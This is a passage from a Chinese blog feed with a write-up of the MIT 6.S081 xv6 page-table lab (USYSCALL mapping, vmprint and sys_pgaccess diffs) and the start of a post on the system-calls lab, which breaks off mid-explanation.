    <content type="html"><![CDATA[<h1 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目要求在每个进程初始化时为它的页表插入一个页表项，内核通过这样预先缓存页表项的操作，来加速特定系统调用的执行速度。</p><p>由于前不久刚过完一遍《OSTEP》，因此我认为自己对页表机制还算比较熟悉，应对本 Lab 理应比较轻松，但在真正上手的时候，还是觉得有些无所适从，无奈老老实实地把 xv6 手册的第 3 章对照着代码仔细研读了一番，从中提炼出了几个关键的函数：</p><ol><li><code>kernel/kalloc.c:kalloc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历空闲链表，寻找一个可分配的物理页面。若找到，返回该页面的首（物理）地址；否则，返回 0 （空指针）。</p><ol start="2"><li><code>kernel/kalloc.c:kfree</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放已分配的首地址为 <code>pa</code> 的物理页面，并更新空闲链表。</p><ol start="3"><li><code>kernel/proc.c:allocproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span><span class="token function">allocproc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历进程数组 <code>proc</code>，寻找未被使用的 <code>struct proc</code>。若找到，则初始化其状态，为创建一个新的<strong>页表</strong>，并返回指向它的指针；否则，返回 0（空指针）。</p><ol start="4"><li><code>kernel/proc.c:freeproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">freeproc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放与进程 <code>p</code> 相关的数据的内存空间，并清空 <code>p</code> 的 <code>struct proc</code> 的所有信息。</p><ol start="5"><li><code>kernel/vm.c:mappages</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mappages</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 size<span class="token punctuation">,</span> uint64 pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在页表 <code>pagetrable</code> 中创建从起始虚拟地址 <code>va</code> 到起始物理地址 <code>pa</code> 的页表项映射，页表项的 <code>flags</code> 位的访问权限部分设置为 <code>perm</code>，其中大小为 <code>size</code>，将 <code>size</code> 分为若干页，为这些页面创建 <code>va + i * PGSIZE -&gt; pa + i * PGSIZE</code> （<code>i</code> 代表页面的编号）的映射。</p><ol start="6"><li><code>kernel/vm.c:uvmunmap</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">uvmunmap</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 npages<span class="token punctuation">,</span> <span class="token keyword">int</span> do_free<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>从 <code>pagetable</code> 中移除从虚拟地址 <code>va</code> 开始的 <code>npages</code> 个页表项。可指定 <code>do_free</code> 的值，若不为 0，则在移除页表项的同时，释放页表项映射 <code>va -&gt; pa</code> 中 <code>pa</code> 指向的内存空间。 </p><p>分析完几个关键函数之后，思路就比较清晰了：</p><ol><li>为 <code>struct proc</code> 结构体添加 <code>struct usyscall *usc</code> 段。</li><li>在 <code>allocproc()</code> 中为 <code>usc</code> 分配物理内存，并对其赋值：<code>p-&gt;usc-&gt;pid = p-&gt;pid;</code>。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">usyscall</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">freeproc</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p<span class="token operator">-></span>usc<span class="token operator">-></span>pid <span class="token operator">=</span> p<span class="token operator">-></span>pid<span class="token punctuation">;</span></code></pre><ol start="3"><li>在 <code>freeproc()</code> 中释放 <code>usc</code> 的物理内存。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><ol start="4"><li>在 <code>proc_pagetable()</code> 中使用 <code>mappages</code> 插入虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_R <span class="token operator">|</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAMPOLINE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAPFRAME<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmfree</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="5"><li>最后，非常容易忽视的，在 <code>proc_freepagetable()</code> 中删除虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>接下来讲讲我在本题遇到的几个问题。</p><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn1.png"></p><p><strong>原因：</strong> <code>p-&gt;usc-&gt;pid = p-&gt;pid</code> 放在分配物理内存之前，导致空指针解引用。</p><p><strong>问题 2：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn2.png"></p><p><strong>原因：</strong> 未在 <code>proc_freepagetable()</code> 中解除 <code>USYSCALL</code> 的页表项映射，也就是上面提到的容易忽视的第 5 点。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..5fc573f 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -127,6 +127,14 @@ found:<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if ((p->usc = (struct usyscall *)kalloc()) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">freeproc(p);</span><span class="token prefix inserted">+</span><span class="token line">release(&amp;p->lock);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  p->usc->pid = p->pid;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // An empty user page table.</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = proc_pagetable(p);</span><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable == 0)&#123;</span></span>@@ -153,6 +161,9 @@ freeproc(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->trapframe)</span><span class="token prefix unchanged"> </span><span class="token line">    kfree((void*)p->trapframe);</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe = 0;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (p->usc) // here</span><span class="token prefix inserted">+</span><span class="token line">kfree((void*)p->usc);</span><span class="token prefix inserted">+</span><span class="token line">  p->usc = 0;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable)</span><span class="token prefix unchanged"> </span><span class="token line">    proc_freepagetable(p->pagetable, p->sz);</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = 0;</span></span>@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    uvmfree(pagetable, 0);</span><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p->usc), PTE_R | PTE_U) &lt; 0) &#123;  </span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAPFRAME, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmfree(pagetable, 0);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pagetable;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAPFRAME, 1, 0);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, USYSCALL, 1, 0); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  uvmfree(pagetable, sz);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..d25a729 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -82,6 +82,8 @@ struct trapframe &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct usyscall;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">// Per-process state</span><span class="token prefix unchanged"> </span><span class="token line">struct proc &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct spinlock lock;</span></span>@@ -105,4 +107,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  struct usyscall *usc;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span></code></pre><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>仿照 <code>freewalk</code> 函数的写法，递归查找所有有效的页表项，并根据题干要求打印相关信息。涉及的内容较少，如果认真把上面提到的几个关键函数理清楚，并且理解了多级页表的机制，写起来还是比较轻松的，流程如下：</p><p>遍历当前页表中的所有页表项，如果页表项有效（flags 的有效位为 1），则将该页表项转换为物理地址向下递归搜索。需要注意的是在递归查找到第 3 级页表时，就不能继续向下递归了，此时得到的 <code>pa</code> 就是进行虚实地址转换后的物理地址。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..d169300 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/exec.c b/kernel/exec.cindex d62d29d..89f3d74 100644<span class="token coord">--- a/kernel/exec.c</span><span class="token coord">+++ b/kernel/exec.c</span>@@ -115,6 +115,11 @@ exec(char *path, char **argv)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->epc = elf.entry;  // initial program counter = main</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->sp = sp; // initial stack pointer</span><span class="token prefix unchanged"> </span><span class="token line">  proc_freepagetable(oldpagetable, oldsz);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if(p->pid == 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint(p->pagetable);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return argc; // this ends up in a0, the first argument to main(argc, argv)</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..23eeec9 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return -1;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void vmprint_recur(pagetable_t pagetable, int depth) &#123;</span><span class="token prefix inserted">+</span><span class="token line">for (int i = 0; i &lt; 512; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">pte_t pte = pagetable[i];</span><span class="token prefix inserted">+</span><span class="token line">if (pte &amp; PTE_V) &#123; // pte is valid</span><span class="token prefix inserted">+</span><span class="token line">for (int j = 0; j &lt; depth; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf(" ..");</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">uint64 child = PTE2PA(pte);</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: pte %p pa %p\n", i, pte, child);</span><span class="token prefix inserted">+</span><span class="token line">if (depth &lt; 3) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur((pagetable_t)child, depth + 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void vmprint(pagetable_t pagetable) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("page table %p\n", pagetable);</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur(pagetable, 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span></code></pre><h1 id="Detecting-which-pages-have-been-accessed"><a href="#Detecting-which-pages-have-been-accessed" class="headerlink" title="Detecting which pages have been accessed"></a>Detecting which pages have been accessed</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>题目要求实现一个系统调用 <code>sys_pgaccess()</code>，获取指定虚拟页面的<strong>最近被访问信息</strong>。</p><p>算是一个大杂烩的题，把 Lab System calls 的内容和 pagetable 结合起来，不要被 hard 难度标签吓到了，只要前面的 Lab 全都认真完成，再运用一些位运算的技巧，本题其实并不 “hard”。</p><p>所有的系统调用需要的声明已经实现添加好了，我们只需要关注 <code>sys_pgaccess()</code> 的实现即可，基本流程如下：</p><ol><li>和 Lab System calls 一样，使用 <code>argint()</code> 和 <code>argaddr()</code> 获取用户空间传递的参数：<code>base</code>、<code>len</code>、<code>mask</code>。</li><li>函数体内定义一个 <code>kmask</code>，作为 <code>mask</code> 的缓冲区。</li><li>从地址 <code>base</code> 开始遍历连续的 <code>len</code> 的页面，获取该页面的页表项 <code>pte</code>，根据 <code>pte</code> 的访问位对 <code>kmask</code> 进行置位，注意不要忘了每次遍历后将 <code>pte</code> 的访问位置 0。</li><li>遍历完成后，使用 <code>copyout()</code> 将 <code>kmask</code> 的数据存入用户空间 <code>mask</code> 处。</li></ol><p>有一个值得注意的问题，根据提示：</p><blockquote><p>It’s okay to set an upper limit on the number of pages that can be scanned.</p></blockquote><p>可以设定一个最大扫描范围，这主要根据 <code>kmask</code> 的数据类型而定，这里我选择使用 <code>long</code> 类型，那么最大扫描范围自然就是 64（<code>long</code> 类型为 8 字节大小，64 bit）。</p><p>同时，在对 <code>kmask</code> 操作时，可以运用一些位运算的技巧：</p><p>首先可以将 <code>kmask</code> 置为 0（二进制位全为 0），如果页面 i 的访问位为 1，则使用 <code>kmask |= (1 &lt;&lt; i)</code>，将 <code>kmask</code> 第 i 位置为 1 而不影响其它位（<code>0 | 0 = 0; 1 | 0 = 1</code>）。</p><p>要清除 <code>pte</code> 的访问位，可使用 <code>*pte &amp;= ~PTE_A</code>，其中 <code>PTE_A = 1L &lt;&lt; 6</code>，即访问位为 1，其它位都为 0，取反后，访问位为 0，其它位都为 1，与其进行按位与运算可将访问位置为 0，而不影响其它位（<code>0 &amp; 1 = 0; 1 &amp; 1 = 1</code>）。</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/walk.png"></p><p><strong>原因：</strong> 比较坑的一个问题，原因是 <code>kernel/defs.h</code> 中没有 <code>walk</code> 函数声明，需要手动添加。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex d169300..53f1f88 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t *walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..6b130fe 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,7 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_A (1L &lt;&lt; 6) // access bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3bd0007..359847c 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -81,6 +81,36 @@ int<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">sys_pgaccess(void)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  // lab pgtbl: your code here.</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">  void *base, *mask;</span><span class="token prefix inserted">+</span><span class="token line">  long kmask; // buffer</span><span class="token prefix inserted">+</span><span class="token line">  int len;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argint(1, &amp;len) &lt; 0 || len > 64) &#123; // page limited to 64</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  kmask = 0L; // initialize bitmask to zero</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; len; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 va = (uint64)(base + i * PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">pte = walk(p->pagetable, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">if (*pte &amp; PTE_A) &#123; // pte was accessed recently</span><span class="token prefix inserted">+</span><span class="token line">  kmask |= (1 &lt;&lt; i);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">*pte &amp;= ~PTE_A; // clear access bit</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (copyout(p->pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">#endif</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Speed-up-system-calls&quot;&gt;&lt;a href=&quot;#Speed-up-system-calls&quot; class=&quot;headerlink&quot; title=&quot;Speed up system calls&quot;&gt;&lt;/a&gt;Speed up system calls&lt;/</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab System calls</title>
    <link href="http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/"/>
    <id>http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/</id>
    <published>2024-06-27T03:45:11.000Z</published>
    <updated>2024-06-27T03:39:54.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xv6系统调用实现"><a href="#xv6系统调用实现" class="headerlink" title="xv6系统调用实现"></a>xv6系统调用实现</h1><p>不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是要在内核层面实现一些系统调用。这其中难免涉及到一些对内核数据结构的操作，以及处理器体系结构（本系列 Lab 基于 RISCV）相关的内容，那么首先有必要梳理一下 xv6 下系统调用的实现过程。</p><p>xv6 系统调用的实现：</p><ol><li>以 <code>trace</code> 系统调用为例，用户通过调用 <code>user/user.h</code> 中的函数 <code>trace</code> 进行系统调用。</li><li>通过调用 Perl 脚本 <code>user/usys.pl</code> 生成的一系列汇编代码，该汇编代码的作用是设置寄存器的内容并实现用户态到内核态的切换，内核后续针对寄存器中的内容执行相应的系统调用操作。以下是对 <code>user/usys.pl</code> 代码的逐行解析：</li></ol><blockquote><ol><li><p><code>#!/usr/bin/perl -w</code>：这是一个Perl脚本的“shebang”行，指定使用<code>/usr/bin/perl</code>解释器执行此脚本，并开启警告（<code>-w</code>）选项。</p></li><li><p><code>print &quot;# generated by usys.pl - do not edit\n&quot;;</code>：打印注释说明此文件是由<code>usys.pl</code>脚本自动生成的，不应手动编辑。</p></li><li><p><code>print &quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;;</code>：输出一条预处理器指令，包含一个名为<code>syscall.h</code>的头文件，该文件可能包含了系统调用相关的常量和宏定义。</p></li><li><p><code>sub entry &#123;...&#125;</code>：定义了一个名为<code>entry</code>的子程序（函数），它接受一个参数（系统调用名称）。</p></li><li><p><code>my $name = shift;</code>：在<code>entry</code>函数内部，使用<code>shift</code>函数获取传入的第一个参数（系统调用名称），并将其存储在变量<code>$name</code>中。</p></li><li><p>接下来的几行<code>print</code>语句构造了每个系统调用存根的汇编代码：</p><ul><li><code>.global $name</code>：声明一个全局标签（函数名），使得链接器能够找到它。</li><li><code>$&#123;name&#125;:\n</code>：定义了一个标签，对应于系统调用函数的开始。</li><li><code>li a7, SYS_$&#123;name&#125;\n</code>：装载（load 